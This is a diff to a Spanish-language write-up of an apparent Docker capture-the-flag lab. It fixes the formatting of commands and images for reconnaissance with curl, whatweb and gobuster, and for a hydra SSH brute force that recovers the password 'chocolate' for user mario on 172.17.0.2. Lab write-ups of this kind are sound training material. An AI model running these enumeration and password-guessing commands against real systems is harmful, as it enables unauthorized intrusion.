@@ -31,6 +31,8 @@ sudo su
 ```
 sudo -/auto_deploy.sh trust.tar
 ```
+<img src="docker_capture.png" alt="MDN" />
+
 
 <br></br>
 ## 🔍 Paso 01: Reconocimiento y Enumeración
@@ -64,7 +66,7 @@ Se inspeccionó el servidor web en el puerto 80 analizando las cabeceras de
 respuesta y los metadatos de la página:
 
 ```
-curl -I [http://172.17.0.2](http://172.17.0.2)
+curl -I http://172.17.0.2
 ```
 
 ```
@@ -77,12 +79,13 @@ Content-Length: 10701
 ```
 
 ```
-whatweb [http://172.17.0.2](http://172.17.0.2)
+whatweb http://172.17.0.2
 ```
 
 
 ```
-[http://172.17.0.2](http://172.17.0.2) [200 OK] Country[RESERVED][ZZ], IP[172.17.0.2], Title[Apache2 Debian Default Page: It works]
+http://172.17.0.2 [200 OK] Country [RESERVED][ZZ],
+IP[172.17.0.2], Title[Apache2 Debian Default Page: It works]
 ```
 
 
@@ -94,7 +97,7 @@ Al notar que la página principal devolvía un tamaño comodín (wildcard) const
 se aplicó una regla de exclusión para filtrar falsos positivos:
 
 ```
-gobuster dir -u [http://172.17.0.2/](http://172.17.0.2/) -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak,zip -t 50 --exclude-length 10701
+gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak,zip -t 50 --exclude-length 10701
 ```
 
 ### Resultado:
@@ -116,7 +119,7 @@ Finished
 Al ingresar a la dirección localizada (http://172.17.0.2/secret.php) desde el navegador, la interfaz web expuso el siguiente mensaje:
 
 
-<img src="" alt=""/>
+<img src="page_capture.png" alt="MDN" />
 
 ```
 "Hola Mario, Esta web no se puede hackear."
@@ -160,7 +163,11 @@ hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4 -V
 ### Resultado:
 
 ```
-[22][ssh] host: 172.17.0.2   login: mario   password: chocolate
+[22][ssh] host: 172.17.0.2
+
+login: mario
+password: chocolate
+
 1 of 1 target successfully completed, 1 valid password found
 Hydra finished at 2026-07-19 21:22:43
 ```
